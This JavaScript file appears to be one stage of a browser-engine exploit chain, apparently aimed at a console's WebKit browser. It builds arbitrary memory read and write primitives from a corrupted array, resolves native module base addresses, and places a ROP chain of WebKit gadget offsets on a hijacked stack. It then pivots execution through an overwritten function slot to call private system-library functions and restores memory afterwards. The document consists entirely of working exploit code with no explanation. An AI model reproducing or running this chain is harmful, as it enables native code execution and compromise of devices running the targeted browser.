var result;
var phase="preflight";
try {
  var state=window.__fw14ArrayState;
  var plan=window.__fw14NativePlan;
  var native=window.__fw14NativeInvoke;
  if (!state || !plan || !state.view || !state.array || !state.a ||
      !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0]!==state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !plan.functionSlot || !plan.pivotCell || !plan.pivotObject ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase))
    throw new Error("held_plan_missing");
  var forged=state.view;
  var carrier=state.ownedTypedView;
  var base=state.calibratedViewBase;
  if (carrier.length!==65536 || carrier[0]!==0x31 ||
      carrier[7]!==0xa8 || base%4096!==0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index,count) {
    var out=[];
    for (var n=0;n<count;n++) out.push(forged[index+n]);
    return out;
  }
  function valueOf(bytes) {
    var value=0;
    for (var n=bytes.length-1;n>=0;n--)
      value=value*256+bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value<0 ||
        value>=0x1000000000000)
      throw new Error("pointer_invalid");
    var out=[];
    for (var n=0;n<8;n++)
      out.push(Math.floor(value/Math.pow(2,n*8))&255);
    return out;
  }
  function same(left,right) {
    if (!left || !right || left.length!==right.length) return false;
    for (var n=0;n<left.length;n++)
      if (left[n]!==right[n]) return false;
    return true;
  }
  function addressOf(object) {
    try {
      state.array[0]=object;
      return valueOf(bytesAt(state.index,8));
    } finally {
      state.array[0]=state.a;
    }
  }
  var carrierIndex=addressOf(carrier)-base;
  var carrierSlot=carrierIndex+8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot<0 ||
      carrierSlot+8>=16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal=bytesAt(carrierSlot,8);
  function readAt(address,count) {
    if (!Number.isSafeInteger(address) || address<0x100000000 ||
        address>=0x1000000000000 || count<1 || count>192)
      throw new Error("native_read_invalid");
    var next=pointerBytes(address);
    try {
      for (var n=0;n<8;n++) forged[carrierSlot+n]=next[n];
      var out=[];
      for (var r=0;r<count;r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x=0;x<8;x++)
        forged[carrierSlot+x]=carrierOriginal[x];
    }
  }
  function writeAt(address,bytes) {
    if (!Number.isSafeInteger(address) || address<0x100000000 ||
        address>=0x1000000000000 || address%8!==0 ||
        !bytes || bytes.length!==8)
      throw new Error("native_write_invalid");
    var next=pointerBytes(address);
    try {
      for (var n=0;n<8;n++) forged[carrierSlot+n]=next[n];
      for (var w=0;w<8;w++) carrier[w]=bytes[w];
    } finally {
      for (var x=0;x<8;x++)
        forged[carrierSlot+x]=carrierOriginal[x];
    }
  }
  var frame=native.frame;
  var address=native.frameAddress;
  if (frame.length<0x2000 || address<0x200000000 || address>=0x900000000)
    throw new Error("owned_frame_invalid");
  var scratchOffset=0x300;
  var scratchLength=0x1a8;
  function moduleBase(handle) {
    var original=Array.from(frame.subarray(scratchOffset,
      scratchOffset+scratchLength));
    var dv=new DataView(frame.buffer,frame.byteOffset,frame.byteLength);
    var returned;
    try {
      frame.fill(0,scratchOffset,scratchOffset+scratchLength);
      dv.setUint32(scratchOffset,0x1a8,true);
      dv.setUint32(scratchOffset+4,0,true);
      returned=native.call("dynlib_info_ex",[handle,0,address+scratchOffset]);
      if (returned.value!==0)
        throw new Error("module_info_failed_"+handle);
      var lo=dv.getUint32(scratchOffset+0x110,true);
      var hi=dv.getUint32(scratchOffset+0x114,true);
      return hi*0x100000000+lo;
    } finally {
      for (var x=0;x<original.length;x++) frame[scratchOffset+x]=original[x];
    }
  }
  var ipmi=moduleBase(27);
  var syscore=moduleBase(28);
  if (ipmi<0x800000000 || ipmi>=0x900000000 ||
      syscore<0x800000000 || syscore>=0x900000000)
    throw new Error("module_base_invalid");
  var targets={
    syscore_first_011:[syscore+0x24a0,
      [0x55,0x48,0x89,0xe5,0x53,0x48,0x83,0xec,0x18,0x48,0x8b,0x1d,
       0x78,0x5b,0x00,0x00]],
    syscore_first_012:[syscore+0x2500,
      [0x55,0x48,0x89,0xe5,0x53,0x48,0x83,0xec,0x48,0x48,0x8b,0x1d,
       0x18,0x5b,0x00,0x00]],
    syscore_getter:[syscore+0x1bc0,
      [0x55,0x48,0x89,0xe5,0x53,0x48,0x83,0xec,0x48,0x48,0x8b,0x1d,
       0x58,0x64,0x00,0x00]]
  };
  for (var tname in targets)
    if (!same(readAt(targets[tname][0],16),targets[tname][1]))
      throw new Error("signature_changed_"+tname);
  if (!same(readAt(plan.functionSlot,8),plan.originalFunctionSlot) ||
      !same(readAt(plan.addresses.store,8),
            Array.from(plan.store.subarray(0,8))) ||
      !same(readAt(plan.addresses.stack+plan.stackOffset,8),
            pointerBytes(plan.target)) ||
      Math.abs(Math.expm1(1)-1.718281828459045)>1e-12)
    throw new Error("native_plan_changed");
  var scratchOffset2=0x2f80;
  var chainSize=19*8;
  if (scratchOffset2<plan.stackOffset+64 ||
      scratchOffset2+chainSize>=plan.stack.length ||
      plan.frame.length<0x2000)
    throw new Error("scratch_region_invalid");
  var caller=function (name,args) {
    if (!Object.prototype.hasOwnProperty.call(targets,name))
      throw new Error("target_not_allowed");
    if (!Array.isArray(args) || args.length>6)
      throw new Error("args_invalid");
    var values=[];
    for (var ai=0;ai<6;ai++) {
      var value=ai<args.length?args[ai]:0;
      if (!Number.isSafeInteger(value) || value<0 ||
          value>=0x1000000000000)
        throw new Error("arg_invalid_"+ai);
      values.push(value);
    }
    var target=targets[name][0];
    if (!same(readAt(target,16),targets[name][1]) ||
        !same(readAt(plan.functionSlot,8),plan.originalFunctionSlot) ||
        !same(readAt(plan.addresses.store,8),
              Array.from(plan.store.subarray(0,8))) ||
        !same(readAt(plan.addresses.stack+plan.stackOffset,8),
              pointerBytes(plan.target)) ||
        Math.abs(Math.expm1(1)-1.718281828459045)>1e-12)
      throw new Error("call_preflight_changed");
    var functionOriginal=readAt(plan.functionSlot,8);
    var pivotOriginal=readAt(plan.pivotCell,8);
    var pivotStackOriginal=readAt(plan.addresses.pivot+0x38,8);
    var frameOriginal=Array.from(plan.frame.subarray(0,8));
    var chainOriginal=Array.from(plan.stack.subarray(
      scratchOffset2,scratchOffset2+chainSize));
    if (!same(pivotOriginal.slice(0,7),plan.pivotHeader.slice(0,7)) ||
        pivotOriginal[7]>2 ||
        !same(pivotStackOriginal,
              pointerBytes(plan.addresses.stack+plan.stackOffset)))
      throw new Error("pivot_preflight_changed");
    var functionTouched=false,pivotTouched=false,stackTouched=false;
    var chainTouched=false,frameTouched=false;
    var output=null;
    try {
      frameTouched=true;
      plan.frame.fill(0xa5,0,8);
      if (!same(readAt(plan.addresses.frame,8),
                [0xa5,0xa5,0xa5,0xa5,0xa5,0xa5,0xa5,0xa5]))
        throw new Error("result_sentinel_changed");
      var chain=[plan.webkitBase+0x5c480,values[0],
        plan.webkitBase+0x6e45e,values[1],
        plan.webkitBase+0x12c5ba,values[2],
        plan.webkitBase+0x1bade,values[3],
        plan.webkitBase+0x9b311,values[4],
        plan.webkitBase+0x1dcfb1,values[5],
        target,plan.webkitBase+0x5c480,plan.addresses.frame,
        plan.webkitBase+0x548b,plan.webkitBase+0x10504,null,
        plan.webkitBase+0x182f7];
      var stackView=new DataView(plan.stack.buffer);
      chainTouched=true;
      for (var c=0;c<chain.length;c++) {
        if (c===17) {
          stackView.setUint32(scratchOffset2+c*8,0x0a,true);
          stackView.setUint32(scratchOffset2+c*8+4,0xfffffff7,true);
        } else {
          stackView.setUint32(scratchOffset2+c*8,chain[c]>>>0,true);
          stackView.setUint32(scratchOffset2+c*8+4,
            Math.floor(chain[c]/0x100000000)>>>0,true);
        }
      }
      stackView.setUint32(scratchOffset2+11*8,0xcafebeaf,true);
      stackView.setUint32(scratchOffset2+11*8+4,0xdeadbade,true);
      stackTouched=true;
      var nextStack=pointerBytes(plan.addresses.stack+scratchOffset2);
      for (var s=0;s<8;s++) plan.pivot[0x38+s]=nextStack[s];
      if (!same(readAt(plan.addresses.stack+scratchOffset2,chainSize),
                Array.from(plan.stack.subarray(scratchOffset2,
                                              scratchOffset2+chainSize))) ||
          !same(readAt(plan.addresses.pivot+0x38,8),nextStack))
        throw new Error("chain_readback_failed");
      functionTouched=true;
      writeAt(plan.functionSlot,pointerBytes(plan.webkitBase+0x295f948));
      pivotTouched=true;
      writeAt(plan.pivotCell,pointerBytes(plan.addresses.store));
      if (!same(readAt(plan.functionSlot,8),
                pointerBytes(plan.webkitBase+0x295f948)) ||
          !same(readAt(plan.pivotCell,8),
                pointerBytes(plan.addresses.store)))
        throw new Error("call_arm_failed");
      Math.expm1(plan.pivotObject);
      var frameView=new DataView(plan.frame.buffer);
      output={ value:frameView.getInt32(0,true),
               high:frameView.getUint32(4,true) };
    } finally {
      if (functionTouched) writeAt(plan.functionSlot,functionOriginal);
      if (pivotTouched) writeAt(plan.pivotCell,pivotOriginal);
      if (stackTouched)
        for (var ps=0;ps<8;ps++)
          plan.pivot[0x38+ps]=pivotStackOriginal[ps];
      if (chainTouched)
        for (var cs=0;cs<chainSize;cs++)
          plan.stack[scratchOffset2+cs]=chainOriginal[cs];
      if (frameTouched)
        for (var fs=0;fs<8;fs++) plan.frame[fs]=frameOriginal[fs];
    }
    if (!same(readAt(plan.functionSlot,8),functionOriginal) ||
        !same(readAt(plan.pivotCell,8),pivotOriginal) ||
        !same(readAt(plan.addresses.pivot+0x38,8),pivotStackOriginal) ||
        !same(readAt(plan.addresses.stack+scratchOffset2,chainSize),
              chainOriginal) ||
        !same(readAt(plan.addresses.frame,8),frameOriginal) ||
        !same(bytesAt(carrierSlot,8),carrierOriginal) ||
        carrier[0]!==0x31 || carrier[7]!==0xa8 ||
        state.array[0]!==state.a)
      throw new Error("call_restore_failed");
    return output;
  };
  var out012Offset=0x920,getterOutOffset=0x930;
  var out012Address=address+out012Offset;
  var getterOutAddress=address+getterOutOffset;
  var scratchOriginal=Array.from(frame.subarray(0x500,0x2000));
  var before=native.call("getpid",[]);
  if (before.high!==0 || before.value<1 || before.value>100000)
    throw new Error("session_pid_changed");
  var appClient=0,ret011=0,ret012=0,out012=0,getterRet=0,getterOut=0;
  var call011=null,call012=null,getter=null;
  try {
    phase="firstpath";
    if (api && typeof api.markSync==="function")
      api.markSync("syscore_firstpath_preflight");
    appClient=valueOf(readAt(syscore+0xc048,8));
    if (appClient<0x100000000 || appClient>=0x1000000000000 ||
        appClient%8!==0)
      throw new Error("first_path_client_missing");
    if (api && typeof api.markSync==="function")
      api.markSync("syscore_firstpath_011_before");
    call011=caller("syscore_first_011",[appClient]);
    ret011=call011.value;
    if (api && typeof api.markSync==="function")
      api.markSync("syscore_firstpath_011_after");
    frame.fill(0xa5,out012Offset,out012Offset+0x10);
    if (api && typeof api.markSync==="function")
      api.markSync("syscore_firstpath_012_before");
    call012=caller("syscore_first_012",
      [appClient,out012Address,1]);
    ret012=call012.value;
    out012=new DataView(frame.buffer).getUint32(out012Offset,true);
    if (api && typeof api.markSync==="function")
      api.markSync("syscore_firstpath_012_after");
    frame.fill(0xa5,getterOutOffset,getterOutOffset+0x10);
    if (api && typeof api.markSync==="function")
      api.markSync("syscore_firstpath_getter_before");
    getter=caller("syscore_getter",
      [appClient,before.value,getterOutAddress]);
    getterRet=getter.value;
    getterOut=new DataView(frame.buffer).getUint32(getterOutOffset,true);
    if (api && typeof api.markSync==="function")
      api.markSync("syscore_firstpath_getter_after");
  } finally {
    for (var fi=0;fi<scratchOriginal.length;fi++)
      frame[0x500+fi]=scratchOriginal[fi];
  }
  var after=native.call("getpid",[]);
  var scratchRestored=scratchOriginal.every(function (byte,index) {
    return frame[0x500+index]===byte;
  });
  var callerRestored=same(bytesAt(carrierSlot,8),carrierOriginal) &&
    carrier[0]===0x31 && carrier[7]===0xa8 &&
    state.array[0]===state.a &&
    Math.abs(Math.expm1(1)-1.718281828459045)<=1e-12;
  if (api && typeof api.markSync==="function")
    api.markSync("syscore_firstpath_restored");
  result={id:"syscore_firstpath_v1",
    status:(call011!==null && call012!==null && getter!==null &&
      after.value===before.value && after.high===0 &&
      scratchRestored && callerRestored)?"pass":"fail",
    details:{self_pid:after.value,ipmi_base:ipmi,
      syscore_base:syscore,first_client:appClient,
      ret011:ret011,ret012:ret012,out012:out012,
      getter_ret:getterRet,getter_out:getterOut,
      pid_ok:after.value===before.value&&after.high===0,
      restored:callerRestored&&scratchRestored}};
} catch (error) {
  result={id:"syscore_firstpath_v1",status:"error",
    details:{phase:phase,error:String(error).slice(0,180)}};
}
return [result];
